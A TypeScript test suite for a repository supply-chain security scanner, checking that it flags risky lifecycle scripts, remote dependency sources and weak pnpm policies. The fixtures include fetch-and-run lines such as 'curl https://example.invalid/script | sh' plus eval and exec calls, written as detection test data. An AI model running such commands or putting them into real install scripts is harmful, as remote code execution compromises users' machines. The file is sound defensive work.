import assert from 'node:assert/strict'
import { mkdtempSync, mkdirSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { afterEach, test } from 'node:test'
import { EMPTY_SECURITY_BASELINE, findingFingerprint, parseSecurityBaseline, triageFindings } from './baseline.js'
import { createSecurityReport, renderSecurityReport } from './report.js'
import { scanRepository } from './scanner.js'
import type { SecurityFinding } from './types.js'

const temporaryDirectories: string[] = []

afterEach(() => {
  for (const directory of temporaryDirectories.splice(0)) rmSync(directory, { force: true, recursive: true })
})

test('flags template and dependency supply-chain risks without throwing', () => {
  const rootDir = createFixtureRepository()
  writeJson(join(rootDir, 'community', 'safe-template', 'package.json'), {
    dependencies: { react: '^19.0.0' },
    name: 'safe-template',
  })
  writeJson(join(rootDir, 'community', 'risky-template', 'package.json'), {
    dependencies: {
      'local-package': 'file:../local-package',
      'loose-package': '*',
      'major-range-package': '1.x',
      'remote-package': 'github:example/package',
      'shorthand-package': 'example/package',
      'ssh-package': 'git@github.com:example/package.git',
      'workspace-package': 'workspace:*',
    },
    devDependencies: {
      'remote-package': 'github:example/package',
    },
    name: 'risky-template',
    scripts: {
      inline: 'node -e "console.log(\'review-me\')"',
      postinstall: 'node create.js',
      prepare: 'node create.js',
      shell: 'sh -c "echo review-me"',
      setup: 'curl https://example.invalid/script | sh',
    },
  })
  writeText(join(rootDir, 'community', 'risky-template', 'create.js'), "eval('review-me')\n")
  writeText(
    join(rootDir, 'community', 'risky-template', 'scripts', 'setup.js'),
    `import { exec } from 'node:child_process'\nfetch('https://example.invalid')\naxios({ url: 'https://example.invalid' })\nFunction('return 1')\nexec('echo review-me')\nconst payload = '${'_'.repeat(180)}'\n`,
  )
  writeText(
    join(rootDir, 'community', 'risky-template', 'scripts', 'install.sh'),
    '# curl https://comment.invalid/install.sh | sh\ncurl https://example.invalid/install.sh | sh\nbash -c "echo review-me"\n',
  )
  writeJson(
    join(rootDir, 'node_modules', '.pnpm', 'native-addon@1.0.0', 'node_modules', 'native-addon', 'package.json'),
    { name: 'native-addon', scripts: { install: 'node-gyp rebuild' }, version: '1.0.0' },
  )

  const result = scanRepository(rootDir)
  const ruleIds = result.findings.map((finding) => finding.ruleId)

  assert.equal(result.scannedTemplates, 2)
  assert.equal(result.scannedDependencyPackages, 1)
  assert.ok(ruleIds.includes('manifest-lifecycle-script'))
  assert.ok(ruleIds.includes('script-network-download'))
  assert.ok(ruleIds.includes('script-inline-execution'))
  assert.ok(ruleIds.includes('script-shell-execution'))
  assert.ok(ruleIds.includes('dependency-remote-source'))
  assert.ok(
    result.findings.some(
      (finding) =>
        finding.ruleId === 'dependency-remote-source' &&
        finding.evidence === 'dependencies.ssh-package: git@github.com:example/package.git',
    ),
  )
  assert.ok(
    result.findings.some(
      (finding) =>
        finding.ruleId === 'dependency-remote-source' &&
        finding.evidence === 'dependencies.shorthand-package: example/package',
    ),
  )
  assert.equal(
    result.findings.filter(
      (finding) => finding.ruleId === 'dependency-remote-source' && finding.evidence.includes('remote-package'),
    ).length,
    2,
  )
  assert.ok(ruleIds.includes('dependency-local-source'))
  assert.ok(ruleIds.includes('dependency-workspace-source'))
  assert.ok(ruleIds.includes('dependency-loose-version'))
  assert.ok(ruleIds.includes('source-child-process'))
  assert.ok(ruleIds.includes('source-network-access'))
  assert.ok(ruleIds.includes('source-network-download'))
  assert.ok(ruleIds.includes('source-shell-execution'))
  assert.equal(
    result.findings.some(
      (finding) => finding.ruleId === 'source-network-download' && finding.evidence.includes('comment.invalid'),
    ),
    false,
  )
  assert.ok(ruleIds.includes('source-dynamic-evaluation'))
  assert.ok(ruleIds.includes('source-encoded-payload'))
  const blockedDependency = result.findings.find((finding) => finding.ruleId === 'dependency-build-script-blocked')
  assert.equal(
    blockedDependency?.location,
    'node_modules/.pnpm/native-addon@1.0.0/node_modules/native-addon/package.json',
  )
  assert.equal(
    result.findings.some(
      (finding) => finding.ruleId === 'source-network-access' && finding.evidence.includes('Unable'),
    ),
    false,
  )
  const lifecycleSeverities = result.findings
    .filter((finding) => finding.ruleId === 'manifest-lifecycle-script')
    .map((finding) => finding.severity)
  assert.ok(lifecycleSeverities.includes('high'))
  assert.ok(lifecycleSeverities.includes('medium'))
  assert.deepEqual(result.findings, [...result.findings].sort(compareExpectedFindings))
})

test('reports allowed dependency build scripts as review items', () => {
  const rootDir = createFixtureRepository(['native-addon'])
  writeJson(join(rootDir, 'community', 'safe-template', 'package.json'), { name: 'safe-template' })
  writeJson(
    join(rootDir, 'node_modules', '.pnpm', 'native-addon@1.0.0', 'node_modules', 'native-addon', 'package.json'),
    { name: 'native-addon', scripts: { install: 'node-gyp rebuild' }, version: '1.0.0' },
  )

  const result = scanRepository(rootDir)
  const finding = result.findings.find((item) => item.ruleId === 'dependency-build-script-allowed')

  assert.equal(finding?.severity, 'medium')
  assert.match(finding?.message ?? '', /explicitly allowed/)
})

test('renders stable machine-readable and reviewer-facing summaries', () => {
  const rootDir = createFixtureRepository()
  writeJson(join(rootDir, 'community', 'template', 'package.json'), {
    name: 'template\n\u001b[31m',
    scripts: { postinstall: 'node setup.js' },
  })

  const report = createSecurityReport(scanRepository(rootDir), EMPTY_SECURITY_BASELINE, '2026-08-09T00:00:00.000Z')
  const markdown = renderSecurityReport(report)

  assert.equal(report.schemaVersion, 1)
  assert.equal(report.summary.total, 1)
  assert.equal(report.summary.high, 1)
  assert.equal(report.summary.new, 1)
  assert.equal(report.summary.acknowledged, 0)
  assert.match(markdown, /Advisory only/)
  assert.match(markdown, /manifest-lifecycle-script/)
  assert.match(markdown, /Recommendation:/)
  assert.equal(markdown.includes('\u001b'), false)
  assert.equal(markdown.includes('template\n'), false)
})

test('separates exact acknowledgements from new and stale findings', () => {
  const finding: SecurityFinding = {
    category: 'lifecycle-script',
    evidence: 'postinstall: node setup.js',
    location: 'community/template/package.json',
    message: 'Template declares a postinstall lifecycle script.',
    recommendation: 'Review the invoked code.',
    ruleId: 'manifest-lifecycle-script',
    severity: 'high',
    subject: 'template',
  }
  const baseline = parseSecurityBaseline({
    acknowledgements: [
      {
        fingerprint: findingFingerprint(finding),
        location: finding.location,
        rationale: 'Reviewed local setup script.',
        ruleId: finding.ruleId,
        subject: finding.subject,
      },
    ],
    schemaVersion: 1,
  })

  const acknowledged = triageFindings([finding], baseline)
  assert.equal(acknowledged.findings[0].disposition, 'acknowledged')
  assert.equal(acknowledged.staleAcknowledgements.length, 0)

  const changed = triageFindings([{ ...finding, evidence: 'postinstall: node changed.js' }], baseline)
  assert.equal(changed.findings[0].disposition, 'new')
  assert.equal(changed.staleAcknowledgements.length, 1)

  const longCommand = `${'a'.repeat(160)}first-suffix`
  const longFinding = {
    ...finding,
    evidence: `${'a'.repeat(157)}...`,
    fingerprintEvidence: longCommand,
  }
  const longBaseline = parseSecurityBaseline({
    acknowledgements: [
      {
        fingerprint: findingFingerprint(longFinding),
        location: longFinding.location,
        rationale: 'Reviewed the complete command.',
        ruleId: longFinding.ruleId,
        subject: longFinding.subject,
      },
    ],
    schemaVersion: 1,
  })
  const changedSuffix = triageFindings(
    [{ ...longFinding, fingerprintEvidence: `${'a'.repeat(160)}second-suffix` }],
    longBaseline,
  )
  assert.equal(changedSuffix.findings[0].disposition, 'new')
  assert.equal(changedSuffix.staleAcknowledgements.length, 1)
  assert.equal('fingerprintEvidence' in changedSuffix.findings[0], false)
})

test('rejects duplicate or incomplete baseline acknowledgements', () => {
  const finding: SecurityFinding = {
    category: 'dependency-build',
    evidence: 'install: node-gyp rebuild',
    location: 'node_modules/.pnpm/native/package.json',
    message: 'Dependency has an install-time script.',
    recommendation: 'Review the script.',
    ruleId: 'dependency-build-script-blocked',
    severity: 'low',
    subject: 'native@1.0.0',
  }
  const acknowledgement = {
    fingerprint: findingFingerprint(finding),
    location: finding.location,
    rationale: 'Blocked by pnpm.',
    ruleId: finding.ruleId,
    subject: finding.subject,
  }

  assert.throws(
    () => parseSecurityBaseline({ acknowledgements: [acknowledgement, acknowledgement], schemaVersion: 1 }),
    /duplicate acknowledgement/,
  )
  assert.throws(
    () => parseSecurityBaseline({ acknowledgements: [{ ...acknowledgement, rationale: '' }], schemaVersion: 1 }),
    /non-empty rationale/,
  )
  assert.throws(
    () =>
      triageFindings(
        [finding],
        parseSecurityBaseline({
          acknowledgements: [{ ...acknowledgement, subject: 'different@1.0.0' }],
          schemaVersion: 1,
        }),
      ),
    /metadata does not match/,
  )
})

test('ignores suspicious words in comments and log messages', () => {
  const rootDir = createFixtureRepository()
  writeJson(join(rootDir, 'community', 'template', 'package.json'), { name: 'template' })
  writeText(
    join(rootDir, 'community', 'template', 'scripts', 'messages.ts'),
    "console.log('Unable to fetch (via RPC)')\n// exec('not code')\n/* eval('also not code') */\n",
  )

  assert.deepEqual(scanRepository(rootDir).findings, [])
})

test('reports templates whose transitive dependencies are absent from the workspace lockfile', () => {
  const rootDir = createFixtureRepository()
  writeText(join(rootDir, 'pnpm-lock.yaml'), "lockfileVersion: '9.0'\nimporters:\n  .: {}\n")
  writeJson(join(rootDir, 'community', 'unlocked-template', 'package.json'), {
    dependencies: { react: '^19.0.0' },
    name: 'unlocked-template',
  })

  const finding = scanRepository(rootDir).findings.find((item) => item.ruleId === 'template-lockfile-coverage-missing')
  assert.equal(finding?.severity, 'low')
  assert.match(finding?.evidence ?? '', /1 direct dependencies/)
})

test('reports missing lockfile and installed dependency coverage', () => {
  const rootDir = createFixtureRepository()
  rmSync(join(rootDir, 'pnpm-lock.yaml'))
  rmSync(join(rootDir, 'node_modules'), { recursive: true })
  writeJson(join(rootDir, 'community', 'template', 'package.json'), {
    dependencies: { react: '^19.0.0' },
    name: 'template',
  })

  const findings = scanRepository(rootDir).findings
  assert.equal(findings.find((item) => item.ruleId === 'workspace-lockfile-missing')?.severity, 'high')
  assert.equal(findings.find((item) => item.ruleId === 'installed-dependency-coverage-missing')?.severity, 'high')
  assert.ok(findings.some((item) => item.ruleId === 'template-lockfile-coverage-missing'))
})

test('rejects missing template group configuration', () => {
  const rootDir = createFixtureRepository()
  writeJson(join(rootDir, 'package.json'), { repokit: { groups: [] } })
  assert.throws(() => scanRepository(rootDir), /No template group paths/)

  writeJson(join(rootDir, 'package.json'), { repokit: { groups: [{ path: 'missing' }] } })
  assert.throws(() => scanRepository(rootDir), /does not exist/)

  mkdirSync(join(rootDir, 'community'))
  writeJson(join(rootDir, 'package.json'), { repokit: { groups: [{ path: 'community' }] } })
  assert.throws(() => scanRepository(rootDir), /No template manifests/)
})

test('flags a pnpm policy that allows every dependency build script', () => {
  const rootDir = createFixtureRepository()
  writeText(
    join(rootDir, 'pnpm-workspace.yaml'),
    'dangerouslyAllowAllBuilds: true\nminimumReleaseAge: 1440\nonlyBuiltDependencies:\n  - esbuild\npackages:\n  - community/*\n',
  )
  writeJson(join(rootDir, 'community', 'template', 'package.json'), { name: 'template' })
  writeJson(
    join(rootDir, 'node_modules', '.pnpm', 'native-addon@1.0.0', 'node_modules', 'native-addon', 'package.json'),
    { name: 'native-addon', scripts: { install: 'node-gyp rebuild' }, version: '1.0.0' },
  )

  const findings = scanRepository(rootDir).findings
  const finding = findings.find((item) => item.ruleId === 'pnpm-all-builds-allowed')
  assert.equal(finding?.severity, 'high')
  assert.ok(findings.some((item) => item.ruleId === 'dependency-build-script-allowed'))
  assert.equal(
    findings.some((item) => item.ruleId === 'dependency-build-script-blocked'),
    false,
  )
})

test('flags a disabled minimum package release age', () => {
  const rootDir = createFixtureRepository()
  writeText(
    join(rootDir, 'pnpm-workspace.yaml'),
    'minimumReleaseAge: 0\nonlyBuiltDependencies:\n  - esbuild\npackages:\n  - community/*\n',
  )
  writeJson(join(rootDir, 'community', 'template', 'package.json'), { name: 'template' })

  const finding = scanRepository(rootDir).findings.find((item) => item.ruleId === 'pnpm-minimum-release-age-disabled')
  assert.equal(finding?.severity, 'medium')
})

test('flags a weakened or globally excluded minimum package release age', () => {
  const rootDir = createFixtureRepository()
  writeText(
    join(rootDir, 'pnpm-workspace.yaml'),
    'minimumReleaseAge: 60\nminimumReleaseAgeExclude:\n  - "*"\nonlyBuiltDependencies:\n  - esbuild\npackages:\n  - community/*\n',
  )
  writeJson(join(rootDir, 'community', 'template', 'package.json'), { name: 'template' })

  const findings = scanRepository(rootDir).findings
  assert.equal(findings.find((item) => item.ruleId === 'pnpm-minimum-release-age-too-low')?.severity, 'medium')
  assert.equal(findings.find((item) => item.ruleId === 'pnpm-minimum-release-age-globally-excluded')?.severity, 'high')
})

test('rejects template group paths outside the repository', () => {
  const rootDir = createFixtureRepository()
  writeJson(join(rootDir, 'package.json'), {
    repokit: { groups: [{ path: '../outside' }] },
  })

  assert.throws(() => scanRepository(rootDir), /escapes the repository/)
})

test('rejects template group links outside the repository', () => {
  const rootDir = createFixtureRepository()
  const outsideDir = mkdtempSync(join(tmpdir(), 'template-security-outside-'))
  temporaryDirectories.push(outsideDir)
  symlinkSync(outsideDir, join(rootDir, 'linked-group'), process.platform === 'win32' ? 'junction' : 'dir')
  writeJson(join(rootDir, 'package.json'), {
    repokit: { groups: [{ path: 'linked-group' }] },
  })

  assert.throws(() => scanRepository(rootDir), /escapes the repository/)
})

function createFixtureRepository(onlyBuiltDependencies: readonly string[] = ['esbuild']): string {
  const rootDir = mkdtempSync(join(tmpdir(), 'template-security-'))
  temporaryDirectories.push(rootDir)
  writeJson(join(rootDir, 'package.json'), {
    repokit: { groups: [{ path: 'community' }] },
  })
  writeText(
    join(rootDir, 'pnpm-workspace.yaml'),
    `minimumReleaseAge: 1440\nonlyBuiltDependencies:\n${onlyBuiltDependencies.map((name) => `  - ${name}\n`).join('')}packages:\n  - community/*\n`,
  )
  writeText(
    join(rootDir, 'pnpm-lock.yaml'),
    "lockfileVersion: '9.0'\nimporters:\n  .: {}\n  community/risky-template: {}\n  community/safe-template: {}\n  community/template: {}\n",
  )
  mkdirSync(join(rootDir, 'node_modules', '.pnpm'), { recursive: true })
  return rootDir
}

function writeJson(path: string, value: unknown): void {
  writeText(path, `${JSON.stringify(value, null, 2)}\n`)
}

function writeText(path: string, value: string): void {
  mkdirSync(dirname(path), { recursive: true })
  writeFileSync(path, value)
}

function compareExpectedFindings(
  left: ReturnType<typeof scanRepository>['findings'][number],
  right: ReturnType<typeof scanRepository>['findings'][number],
): number {
  const severityOrder = { high: 0, medium: 1, low: 2 }
  return (
    severityOrder[left.severity] - severityOrder[right.severity] ||
    left.location.localeCompare(right.location) ||
    left.ruleId.localeCompare(right.ruleId) ||
    left.subject.localeCompare(right.subject)
  )
}
